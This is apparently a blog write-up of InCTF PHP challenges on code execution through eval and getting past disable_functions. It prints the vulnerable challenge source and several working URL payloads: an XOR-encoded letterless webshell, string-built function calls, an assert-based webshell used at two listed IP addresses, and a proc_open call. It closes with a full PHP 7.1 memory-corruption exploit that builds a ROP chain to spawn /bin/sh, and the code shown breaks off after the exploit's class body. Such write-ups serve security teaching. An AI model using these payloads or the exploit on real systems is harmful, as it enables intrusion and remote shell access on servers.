

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="osword">
  <meta name="keywords" content="">
  <title>Inctf题解 | rce+disable_functions bypass - osword&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2019-09-24 21:03" pubdate>
        2019年9月24日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      1.6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      29
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">Inctf题解 | rce+disable_functions bypass</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="php1-0"><a href="#php1-0" class="headerlink" title="php1.0"></a>php1.0</h1><pre><code class="hljs php">File doesn<span class="hljs-string">'t exist</span>
<span class="hljs-string">&lt;?php</span>
<span class="hljs-string"></span>
<span class="hljs-string">$input = $_GET['</span>input<span class="hljs-string">'];</span>
<span class="hljs-string"></span>
<span class="hljs-string">function check()&#123;</span>
<span class="hljs-string">  global $input;</span>
<span class="hljs-string">  foreach (get_defined_functions()['</span>internal<span class="hljs-string">'] as $blacklisted) &#123;</span>
<span class="hljs-string">      if (preg_match ('</span>/<span class="hljs-string">' . $blacklisted . '</span>/im<span class="hljs-string">', $input)) &#123;</span>
<span class="hljs-string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span>
<span class="hljs-string">          return true;</span>
<span class="hljs-string">          break;</span>
<span class="hljs-string">      &#125;</span>
<span class="hljs-string">  &#125;</span>
<span class="hljs-string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span>
<span class="hljs-string">  unset($blacklist);</span>
<span class="hljs-string">  return false;</span>
<span class="hljs-string">&#125;</span>
<span class="hljs-string"></span>
<span class="hljs-string">$thisfille=$_GET['</span>thisfile<span class="hljs-string">'];</span>
<span class="hljs-string"></span>
<span class="hljs-string">if(is_file($thisfille))&#123;</span>
<span class="hljs-string">  echo "You can'</span>t <span class="hljs-keyword">use</span> <span class="hljs-title">inner</span> <span class="hljs-title">file</span>" . "&lt;<span class="hljs-title">br</span>&gt;";
&#125;
<span class="hljs-keyword">else</span>&#123;
  <span class="hljs-keyword">if</span>(file_exists($thisfille))&#123;
    <span class="hljs-keyword">if</span>(check())&#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Naaah"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;
    &#125;<span class="hljs-keyword">else</span>&#123;
      <span class="hljs-keyword">eval</span>($input);
    &#125;
  &#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File doesn't exist"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;
  &#125;

&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">iterate</span><span class="hljs-params">($ass)</span></span>&#123;
    <span class="hljs-keyword">foreach</span>($ass <span class="hljs-keyword">as</span> $hole)&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"AssHole"</span>;
    &#125;
&#125;

highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>代码分析：可控有两个参数$thisfille、$input</p>
<p>$input传入参数会被eval执行，但是之前需要经过<code>get_defined_functions()[&#39;internal&#39;]</code>，过滤所有php内置函数</p>
<h2 id="思路一：无字母webshell"><a href="#思路一：无字母webshell" class="headerlink" title="思路一：无字母webshell"></a>思路一：无字母webshell</h2><pre><code class="hljs mel">?input=$b=$&#123;%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff&#125;[a];<span class="hljs-keyword">eval</span>($b);&amp;thisfile=/var</code></pre>

<p><img src="./1569293365248.png" srcset="/img/loading.gif" alt="1569293365248"></p>
<h2 id="思路二：字符串拼接"><a href="#思路二：字符串拼接" class="headerlink" title="思路二：字符串拼接"></a>思路二：字符串拼接</h2><p><img src="./1569293549103.png" srcset="/img/loading.gif" alt="1569293549103"></p>
<p><code>$b=p.h.p.i.n.f.o;$b();</code></p>
<p><img src="./1569306232614.png" srcset="/img/loading.gif" alt="1569306232614"></p>
<p><strong>函数禁用</strong></p>
<pre><code class="hljs php">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</code></pre>

<h3 id="os命令执行"><a href="#os命令执行" class="headerlink" title="os命令执行"></a>os命令执行</h3><p><code>proc_open</code>函数未被禁用</p>
<p>函数参考链接:<a href="https://www.php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.proc-open.php</a></p>
<p>$process中存储返回proc_open函数,stream_get_contents输出内容</p>
<pre><code class="hljs php">/?input=$descr=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'p'</span>.<span class="hljs-string">'ipe'</span>,<span class="hljs-string">'r'</span>),<span class="hljs-number">1</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'p'</span>.<span class="hljs-string">'ipe'</span>,<span class="hljs-string">'w'</span>),<span class="hljs-number">2</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'p'</span>.<span class="hljs-string">'ipe'</span>,<span class="hljs-string">'w'</span>));$pxpes=<span class="hljs-keyword">array</span>();$process=<span class="hljs-keyword">eval</span>(<span class="hljs-string">'return proc'</span>.$thisfille[<span class="hljs-number">8</span>].<span class="hljs-string">'open("/readFlag",$descr,$pxpes);'</span>);<span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo(s'</span>.<span class="hljs-string">'t'</span>.<span class="hljs-string">'r'</span>.<span class="hljs-string">'e'</span>.<span class="hljs-string">'a'</span>.<span class="hljs-string">'m'</span>.$thisfille[<span class="hljs-number">8</span>].<span class="hljs-string">'g'</span>.<span class="hljs-string">'e'</span>.<span class="hljs-string">'t'</span>.$thisfille[<span class="hljs-number">8</span>].<span class="hljs-string">'c'</span>.<span class="hljs-string">'o'</span>.<span class="hljs-string">'n'</span>.<span class="hljs-string">'t'</span>.<span class="hljs-string">'e'</span>.<span class="hljs-string">'n'</span>.<span class="hljs-string">'t'</span>.<span class="hljs-string">'s($pxpes[1]));'</span>);&amp;thisfile=/lib/x86_64-linux-gnu</code></pre>

<p><img src="./1569307976631.png" srcset="/img/loading.gif" alt="1569307976631"></p>
<h1 id="php1-5、php2-5"><a href="#php1-5、php2-5" class="headerlink" title="php1.5、php2.5"></a>php1.5、php2.5</h1><pre><code class="hljs php"><span class="hljs-comment">//php2.5</span>
File doesn<span class="hljs-string">'t exist</span>
<span class="hljs-string">&lt;?php</span>
<span class="hljs-string"></span>
<span class="hljs-string">$input = $_GET['</span>input<span class="hljs-string">'];</span>
<span class="hljs-string"></span>
<span class="hljs-string">function check()&#123;</span>
<span class="hljs-string">  global $input;</span>
<span class="hljs-string">  foreach (get_defined_functions()['</span>internal<span class="hljs-string">'] as $blacklisted) &#123;</span>
<span class="hljs-string">      if (preg_match ('</span>/<span class="hljs-string">' . $blacklisted . '</span>/im<span class="hljs-string">', $input)) &#123;</span>
<span class="hljs-string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span>
<span class="hljs-string">          return true;</span>
<span class="hljs-string">          break;</span>
<span class="hljs-string">      &#125;</span>
<span class="hljs-string">  &#125;</span>
<span class="hljs-string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span>
<span class="hljs-string">  if(preg_match("/$blacklist/i", $input))&#123;</span>
<span class="hljs-string">    echo "Do you really you need that?" . "&lt;br&gt;";</span>
<span class="hljs-string">    return true;</span>
<span class="hljs-string">  &#125;</span>
<span class="hljs-string"></span>
<span class="hljs-string">  unset($blacklist);</span>
<span class="hljs-string">  if(strlen($input)&gt;100)&#123;  #That is random no. I took ;)</span>
<span class="hljs-string">    echo "This is getting really large input..." . "&lt;br&gt;";</span>
<span class="hljs-string">    return true;</span>
<span class="hljs-string">  &#125;  </span>
<span class="hljs-string">  return false;</span>
<span class="hljs-string">&#125;</span>
<span class="hljs-string"></span>
<span class="hljs-string">$thisfille=$_GET['</span>thisfile<span class="hljs-string">'];</span>
<span class="hljs-string"></span>
<span class="hljs-string">if(is_file($thisfille))&#123;</span>
<span class="hljs-string">  echo "You can'</span>t <span class="hljs-keyword">use</span> <span class="hljs-title">inner</span> <span class="hljs-title">file</span>" . "&lt;<span class="hljs-title">br</span>&gt;";
&#125;
<span class="hljs-keyword">else</span>&#123;
  <span class="hljs-keyword">if</span>(file_exists($thisfille))&#123;
    <span class="hljs-keyword">if</span>(check())&#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Naaah"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;
    &#125;<span class="hljs-keyword">else</span>&#123;
      <span class="hljs-keyword">eval</span>($input);
    &#125;
  &#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File doesn't exist"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;
  &#125;

&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">iterate</span><span class="hljs-params">($ass)</span></span>&#123;
    <span class="hljs-keyword">foreach</span>($ass <span class="hljs-keyword">as</span> $hole)&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"AssHole"</span>;
    &#125;
&#125;

highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>





<pre><code class="hljs php"><span class="hljs-comment">//php1.5</span>
File doesn<span class="hljs-string">'t exist</span>
<span class="hljs-string">&lt;?php</span>
<span class="hljs-string"></span>
<span class="hljs-string">$input = $_GET['</span>input<span class="hljs-string">'];</span>
<span class="hljs-string"></span>
<span class="hljs-string">function check()&#123;</span>
<span class="hljs-string">  global $input;</span>
<span class="hljs-string">  foreach (get_defined_functions()['</span>internal<span class="hljs-string">'] as $blacklisted) &#123;</span>
<span class="hljs-string">      if (preg_match ('</span>/<span class="hljs-string">' . $blacklisted . '</span>/im<span class="hljs-string">', $input)) &#123;</span>
<span class="hljs-string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span>
<span class="hljs-string">          return true;</span>
<span class="hljs-string">          break;</span>
<span class="hljs-string">      &#125;</span>
<span class="hljs-string">  &#125;</span>
<span class="hljs-string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span>
<span class="hljs-string">  if(preg_match("/$blacklist/i", $input))&#123;</span>
<span class="hljs-string">    echo "Do you really you need that?" . "&lt;br&gt;";</span>
<span class="hljs-string">    return true;</span>
<span class="hljs-string">  &#125;</span>
<span class="hljs-string"></span>
<span class="hljs-string">  unset($blacklist);</span>
<span class="hljs-string">  return false;</span>
<span class="hljs-string">&#125;</span>
<span class="hljs-string"></span>
<span class="hljs-string">$thisfille=$_GET['</span>thisfile<span class="hljs-string">'];</span>
<span class="hljs-string"></span>
<span class="hljs-string">if(is_file($thisfille))&#123;</span>
<span class="hljs-string">  echo "You can'</span>t <span class="hljs-keyword">use</span> <span class="hljs-title">inner</span> <span class="hljs-title">file</span>" . "&lt;<span class="hljs-title">br</span>&gt;";
&#125;
<span class="hljs-keyword">else</span>&#123;
  <span class="hljs-keyword">if</span>(file_exists($thisfille))&#123;
    <span class="hljs-keyword">if</span>(check())&#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Naaah"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;
    &#125;<span class="hljs-keyword">else</span>&#123;
      <span class="hljs-keyword">eval</span>($input);
    &#125;
  &#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File doesn't exist"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;
  &#125;

&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">iterate</span><span class="hljs-params">($ass)</span></span>&#123;
    <span class="hljs-keyword">foreach</span>($ass <span class="hljs-keyword">as</span> $hole)&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"AssHole"</span>;
    &#125;
&#125;

highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<h2 id="新增过滤"><a href="#新增过滤" class="headerlink" title="新增过滤"></a>新增过滤</h2><pre><code class="hljs php"><span class="hljs-keyword">exit</span>|<span class="hljs-keyword">die</span>|<span class="hljs-keyword">eval</span>|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\<span class="hljs-string">"|\'</span></code></pre>

<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><pre><code class="hljs http">?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=c.u.r.r.e.n.t;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></pre>

<p><img src="./1569319304201.png" srcset="/img/loading.gif" alt="1569319304201"></p>
<p>不知道为啥，这里蚁剑连接只能用end函数取post数组</p>
<p>payload:<code>http://3.16.218.96/?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=e.n.d;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></p>
<p><img src="./1569323686363.png" srcset="/img/loading.gif" alt="1569323686363"></p>
<p>payload:<code>http://18.223.159.46//?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=e.n.d;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></p>
<p><img src="./1569323729563.png" srcset="/img/loading.gif" alt="1569323729563"></p>
<h2 id="payload3-proc-open文件写到tmp"><a href="#payload3-proc-open文件写到tmp" class="headerlink" title="payload3(proc_open文件写到tmp)"></a>payload3(proc_open文件写到tmp)</h2><p><img src="./1569327504127.png" srcset="/img/loading.gif" alt="1569327504127"></p>
<h2 id="php2-0"><a href="#php2-0" class="headerlink" title="php2.0"></a>php2.0</h2><p>源码和2.5相同，不过php环境为7.1</p>
<p>参考链接：<a href="https://ctftime.org/writeup/16665" target="_blank" rel="noopener">https://ctftime.org/writeup/16665</a></p>
<p>本地测试</p>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">This exploit works only on a specific php7.1 build for Ubuntu 16.04.</span>
<span class="hljs-comment">(php 7.1.32-1+ubuntu16.04.1+deb.sury.org+1 + apache2)</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">1. Install php7.1:</span>
<span class="hljs-comment">    sudo add-apt-repository ppa:ondrej/php</span>
<span class="hljs-comment">    sudo apt install php7.1 libapache2-mod-php7.1</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">2. Save this file as /var/www/html/pwn.php.</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">3. Get an interactive shell with pwntools:</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">    from pwn import *</span>
<span class="hljs-comment">    s = remote('localhost', 80)</span>
<span class="hljs-comment">    p = 'GET /pwn.php HTTP/1.1\r\n'</span>
<span class="hljs-comment">    p += 'Host: localhost\r\n\r\n'</span>
<span class="hljs-comment">    s.send(p)</span>
<span class="hljs-comment">    s.interactive()</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">*/</span>

define(<span class="hljs-string">'SOCK_FD'</span>, <span class="hljs-number">11</span>); <span class="hljs-comment"># client &lt;-&gt; server fd</span>
define(<span class="hljs-string">'POP_RDI'</span>, <span class="hljs-number">0xd14eb</span>);
define(<span class="hljs-string">'POP_RSI'</span>, <span class="hljs-number">0xd157f</span>);
define(<span class="hljs-string">'POP_RDX'</span>, <span class="hljs-number">0xd5033</span>);
define(<span class="hljs-string">'POP_RCX'</span>, <span class="hljs-number">0xff87a</span>);
define(<span class="hljs-string">'SYSCALL_PLT'</span>, <span class="hljs-number">0xcf800</span>);
define(<span class="hljs-string">'BIN_SH'</span>, <span class="hljs-number">0x33bb9e</span>);
define(<span class="hljs-string">'STACK_PIVOT'</span>, <span class="hljs-number">0xd1577</span>); <span class="hljs-comment"># push rdi ; ... ; pop rsp ; pop r13 ; pop r14 ; ret</span>
define(<span class="hljs-string">'ZEND_OBJECTS_DESTROY_OBJECT'</span>, <span class="hljs-number">0x2952d0</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySplFixedArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFixedArray</span> </span>&#123; &#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Z</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rebase</span><span class="hljs-params">($addr)</span> </span>&#123;
        <span class="hljs-keyword">global</span> $pie;
        <span class="hljs-keyword">return</span> $pie + $addr;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span><span class="hljs-params">(&amp;$str, $p, $v, $n = <span class="hljs-number">8</span>)</span> </span>&#123;
      $i = <span class="hljs-number">0</span>;
      <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n; $i++) &#123;
        $str[$p + $i] = chr($v &amp; <span class="hljs-number">0xff</span>);
        $v &gt;&gt;= <span class="hljs-number">8</span>;
      &#125;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span><span class="hljs-params">(&amp;$str, $p, $s=<span class="hljs-number">8</span>)</span> </span>&#123;
        $address = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span>($j = $s<span class="hljs-number">-1</span>; $j &gt;= <span class="hljs-number">0</span>; $j--) &#123;
            $address &lt;&lt;= <span class="hljs-number">8</span>;
            $address |= ord($str[$p+$j]);
        &#125;
        <span class="hljs-keyword">return</span> $address;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span><span class="hljs-params">($ptr, $m=<span class="hljs-number">8</span>)</span> </span>&#123;
        $out = <span class="hljs-string">""</span>;
        <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $m; $i++) &#123;
            $out .= chr($ptr &amp; <span class="hljs-number">0xff</span>);
            $ptr &gt;&gt;= <span class="hljs-number">8</span>;
        &#125;
        <span class="hljs-keyword">return</span> $out;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rop</span><span class="hljs-params">($addr)</span> </span>&#123;
        <span class="hljs-keyword">global</span> $ctr;
        <span class="hljs-comment"># rop starts at abc + 0x1010</span>
        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1010</span> + $ctr * <span class="hljs-number">8</span>, $addr);
        $ctr += <span class="hljs-number">1</span>;

    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">syscall</span><span class="hljs-params">($syscall_no, $rdi=<span class="hljs-number">0</span>, $rsi=<span class="hljs-number">0</span>, $rdx=<span class="hljs-number">0</span>)</span> </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RDI));
        <span class="hljs-keyword">$this</span>-&gt;rop($syscall_no);
        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RSI));
        <span class="hljs-keyword">$this</span>-&gt;rop($rdi);
        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RDX));
        <span class="hljs-keyword">$this</span>-&gt;rop($rsi);
        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(POP_RCX));
        <span class="hljs-keyword">$this</span>-&gt;rop($rdx);
        <span class="hljs-keyword">$this</span>-&gt;rop(<span class="hljs-keyword">$this</span>-&gt;rebase(SYSCALL_PLT));
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">global</span> $y, $pie, $ctr;

        $contiguous = [];
        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">10</span>; $i++)
            $contiguous[] = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">'PT1S'</span>);
        $room = [];
        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">10</span>;$i++)
            $room[] = <span class="hljs-keyword">new</span> Z();
        $_protector = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">78</span>);

        <span class="hljs-keyword">$this</span>-&gt;abc = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);
        $p = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">'PT1S'</span>);

        <span class="hljs-keyword">unset</span>($y[<span class="hljs-number">0</span>]);
        <span class="hljs-keyword">unset</span>($p);
        $protector = <span class="hljs-string">".$_protector"</span>;

        $x = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">'PT1S'</span>);
        $x-&gt;d = <span class="hljs-number">0x2000</span>; <span class="hljs-comment"># $this-&gt;abc is now of size 0x2000</span>
  
        $spl1 = <span class="hljs-keyword">new</span> MySplFixedArray();
        $spl2 = <span class="hljs-keyword">new</span> MySplFixedArray();

        <span class="hljs-comment"># some leaks</span>
        $class_entry = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>);
        $handlers = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x128</span>);
        $php_heap = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>);
        $abc_addr = $php_heap - <span class="hljs-number">0x218</span>;

        <span class="hljs-comment"># pie leak</span>
        $fake_obj = $abc_addr + <span class="hljs-number">0x60</span>;
        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);
        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x68</span>, $handlers - <span class="hljs-number">0x10</span>);
        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>, $fake_obj);
        $pie = <span class="hljs-keyword">$this</span>-&gt;str2ptr(get_class($spl1), <span class="hljs-number">8</span>) - ZEND_OBJECTS_DESTROY_OBJECT;

        <span class="hljs-comment"># write rop</span>
        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">33</span>, SOCK_FD, <span class="hljs-number">1</span>); <span class="hljs-comment"># dup2</span>
        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">33</span>, SOCK_FD, <span class="hljs-number">0</span>); <span class="hljs-comment"># dup2</span>
        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">59</span>, <span class="hljs-keyword">$this</span>-&gt;rebase(BIN_SH)); <span class="hljs-comment"># execve</span>
        <span class="hljs-keyword">$this</span>-&gt;syscall(<span class="hljs-number">60</span>, <span class="hljs-number">0</span>); <span class="hljs-comment"># exit</span>

        <span class="hljs-comment"># overwrite next chunk forward pointer</span>
        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>, $class_entry + <span class="hljs-number">0x20</span>);

        <span class="hljs-comment"># allocate some strings</span>
        $x = str_repeat(<span class="hljs-string">"X"</span>, <span class="hljs-number">69</span>);
        $y = str_repeat(<span class="hljs-string">"Y"</span>, <span class="hljs-number">69</span>);
        $z = str_repeat(<span class="hljs-string">"Z"</span>, <span class="hljs-number">69</span>);

        <span class="hljs-comment"># $z is now at $class_entry + 0x20</span>
        <span class="hljs-comment"># restore a pointer to some writable addr</span>
        <span class="hljs-keyword">$this</span>-&gt;write($z, <span class="hljs-number">0</span>, $abc_addr); 

        <span class="hljs-comment"># overwrite a function destructor</span>
        <span class="hljs-keyword">$this</span>-&gt;write($z, <span class="hljs-number">0x18</span>, $abc_addr + <span class="hljs-number">0x1000</span>); <span class="hljs-comment"># -&gt; rdi</span>
        <span class="hljs-keyword">$this</span>-&gt;write($z, <span class="hljs-number">0x38</span>, <span class="hljs-keyword">$this</span>-&gt;rebase(STACK_PIVOT)); <span class="hljs-comment"># -&gt; rip</span>

        <span class="hljs-keyword">exit</span>();
    &#125;
&#125;

